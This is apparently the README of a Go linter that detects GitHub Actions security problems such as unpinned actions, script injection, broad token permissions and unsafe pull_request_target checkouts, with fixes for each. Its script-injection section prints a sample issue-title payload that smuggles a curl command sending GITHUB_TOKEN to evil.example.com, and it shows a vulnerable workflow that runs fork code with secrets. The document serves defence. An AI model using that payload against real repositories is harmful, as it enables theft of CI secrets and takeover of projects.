# gh-action-lint

A linter for GitHub Actions workflows that detects common security vulnerabilities. Currently checks for:

- **Unpinned actions** - actions referenced by a tag or branch name rather than a full commit SHA
- **Script injection** - user-controlled data embedded directly in `run:` steps
- **Overly broad permissions** - workflows that omit `permissions:` or use `write-all`
- **`pull_request_target` with untrusted checkout** - workflows that run fork code with write access and secrets

## Installation

```sh
go install github.com/funcan/gh-action-lint@latest
```

Or build from source:

```sh
git clone https://github.com/funcan/gh-action-lint
cd gh-action-lint
go build -o gh-action-lint .
```

## Usage

Run inside any git repository:

```sh
gh-action-lint check
```

To also check whether the actions your workflows depend on are themselves using pinned refs:

```sh
gh-action-lint check --recursive
```

Set `GITHUB_TOKEN` to authenticate requests to GitHub and avoid rate limits:

```sh
GITHUB_TOKEN=$(gh auth token) gh-action-lint check --recursive
```

To skip specific checks, use `--disable-check` with a comma-separated list of check names:

```sh
gh-action-lint check --disable-check permissions
gh-action-lint check --disable-check pins,injections
```

Valid check names are `pins`, `injections`, `permissions`, and `pull-request-target`.

### Example output

```
.github/workflows/ci.yml:7: action not pinned to a SHA: actions/checkout@v4
.github/workflows/ci.yml:9: script injection: ${{ github.event.issue.title }} used directly in run step
.github/workflows/ci.yml:1: no top-level permissions declared; GITHUB_TOKEN defaults to the repository's base permissions (use permissions: {} for least privilege)
```

Exits with code `1` if any warnings are found, making it suitable for use in CI.

## Checks

### Unpinned actions

Pinning to a tag like `@v4` or `@main` means your workflow silently changes if the upstream maintainer (or an attacker who has compromised their account) moves the tag. This is a supply chain attack vector - your CI pipeline executes whatever code the tag now points to.

Pinning to a full 40-character commit SHA gives you a tamper-resistant, fully reproducible build. The tag can be kept as a comment for readability:

```yaml
# Unsafe - tag can be silently moved
- uses: actions/checkout@v4

# Safe - exact content is locked in
- uses: actions/checkout@11bd317f7bc71dd3eee3f1bf1c58bc03de17e433 # v4
```

The following `uses:` patterns are not flagged:

| Pattern | Example | Reason |
|---|---|---|
| Local actions | `./my-action` | No remote ref |
| Docker images | `docker://alpine:3.18` | Not a GitHub Action |

### Script injection

GitHub Actions expressions (`${{ ... }}`) are evaluated **before** the shell runs. If a user-controlled value - such as an issue title or PR branch name - is placed directly inside a `run:` step, an attacker can break out of the intended command and run arbitrary code in your CI environment.

#### Example attack

A workflow that automatically labels issues:

```yaml
on: issues
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Processing issue: ${{ github.event.issue.title }}"
```

An attacker opens an issue with the title:

```
a"; curl https://evil.example.com/exfil?token=$GITHUB_TOKEN; echo "
```

The shell sees:

```sh
echo "Processing issue: a"; curl https://evil.example.com/exfil?token=$GITHUB_TOKEN; echo ""
```

The `GITHUB_TOKEN` (and anything else in the environment) is exfiltrated.

#### The fix

Assign the expression to an environment variable first. The shell then receives the value as data, not as part of the command string, so shell metacharacters in the value are harmless:

```yaml
# Unsafe - expression is interpolated into the shell command
- run: echo "${{ github.event.issue.title }}"

# Safe - value is passed via the environment, not interpolated
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```

The following user-controlled contexts are checked: issue/PR titles and bodies, comment and review bodies, commit messages, PR head branch name, discussion titles and bodies, and page names.

### Workflow permissions

Every workflow receives a `GITHUB_TOKEN` that is automatically scoped to the repository. By default its permissions are determined by your repository or organisation settings - which may be broader than a given workflow actually needs.

Declaring `permissions:` explicitly at the top of the workflow applies the principle of least privilege: each workflow gets only what it needs, and nothing more. If a workflow is compromised (e.g., via script injection or a malicious action), a narrowly scoped token limits the blast radius.

`gh-action-lint` warns when:

- **No top-level `permissions:` is declared** - the token's scope depends on organisation/repository defaults, which may grant unintended write access.
- **`permissions: write-all`** at the workflow or job level - this explicitly grants the token write access to every available scope.

#### Examples

```yaml
# Bad - missing permissions block; defaults apply
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd317f7bc71dd3eee3f1bf1c58bc03de17e433 # v4

# Bad - write-all is almost never necessary
permissions: write-all

# Good - empty block grants no permissions at all (safest default)
permissions: {}

# Good - only grant what the workflow actually needs
permissions:
  contents: read
  pull-requests: write
```

Job-level `permissions:` blocks can further restrict a subset of jobs. `gh-action-lint` does not warn about missing job-level permissions when a workflow-level block is already present.

### `pull_request_target` with untrusted checkout

The `pull_request_target` trigger is designed for workflows that need write access or secrets when responding to pull requests — for example, auto-labelling a PR or posting a comment. Unlike `pull_request`, it runs in the context of the **base branch** (not the contributor's fork), so it always has access to the repository's write token and secrets, even when the PR comes from an external fork.

This is safe as long as the workflow only reads information about the PR (its title, labels, etc.) and does not run code from it. The danger arises when the workflow also checks out the PR's head ref:

```yaml
on: pull_request_target

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd317f7bc71dd3eee3f1bf1c58bc03de17e433 # v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}  # checks out fork code
      - run: ./build.sh                                   # runs that untrusted code
```

Now a contributor can put anything they like in `build.sh`, and it executes with full access to the repository's secrets and write token. This is effectively a remote code execution vulnerability in your CI pipeline.

`gh-action-lint` flags any step in a `pull_request_target` workflow that passes a user-controlled ref to `actions/checkout`:

```
.github/workflows/ci.yml:9: pull_request_target: checkout of PR head ref runs untrusted code with write access and secrets
```

The fix depends on what the workflow actually needs:

- **If it doesn't need to build or test the PR code** — remove the checkout entirely, or check out the base branch (the default when no `ref:` is given).
- **If it does need to build the PR code** — split into two workflows: use `pull_request` to run the untrusted build in a sandboxed environment, then use `workflow_run` to react to the completed run result with write access.

```yaml
# Safe - checks out base branch, not the PR's code
- uses: actions/checkout@11bd317f7bc71dd3eee3f1bf1c58bc03de17e433 # v4
  # no ref: — defaults to the base branch

# Safe - checks out PR code but without secrets (pull_request trigger)
on: pull_request
```

To disable this check:

```sh
gh-action-lint check --disable-check pull-request-target
```

## Ignoring actions

Create a `.gh-lint-ignore` file at the root of your repository to suppress unpinned-action warnings for specific actions. Lines starting with `#` are comments. Script injection warnings are always reported and cannot be suppressed here.

```
# Trusted third-party actions - we accept the tag-pinning risk
actions/checkout
actions/cache@v3   # only suppress this specific ref
```

A pattern without a ref (e.g., `actions/checkout`) matches any ref of that action. A pattern with a ref (e.g., `actions/cache@v3`) matches only that exact ref.

Ignored actions are still traversed during a `--recursive` check, so transitive dependencies of ignored actions are still reported.

## Fixing unpinned actions

Run `fix` to automatically resolve all unpinned refs to their current commit SHA:

```sh
GITHUB_TOKEN=$(gh auth token) gh-action-lint fix
```

Output:

```
.github/workflows/ci.yml:8: actions/checkout@v4 -> actions/checkout@11bd317f... # v4
.github/workflows/ci.yml:9: actions/cache@v3 -> actions/cache@5a3ec84... # v3
```

The original tag is preserved as a comment so the intent remains readable. Already-pinned actions and actions in `.gh-lint-ignore` are left untouched. `GITHUB_TOKEN` is required to resolve refs via the GitHub API.

`fix` also accepts `--disable-check` to skip specific fixes:

```sh
gh-action-lint fix --disable-check permissions   # only pin actions, don't try to fix permissions
gh-action-lint fix --disable-check pins          # only fix missing permissions, don't pin actions
```

Note: `injections` is not a valid target for `fix` (there is no automatic fix for script injection).

To find a SHA manually:

```sh
git ls-remote https://github.com/actions/checkout refs/tags/v4
```

## License

GPLv2 - see [LICENSE](LICENSE).
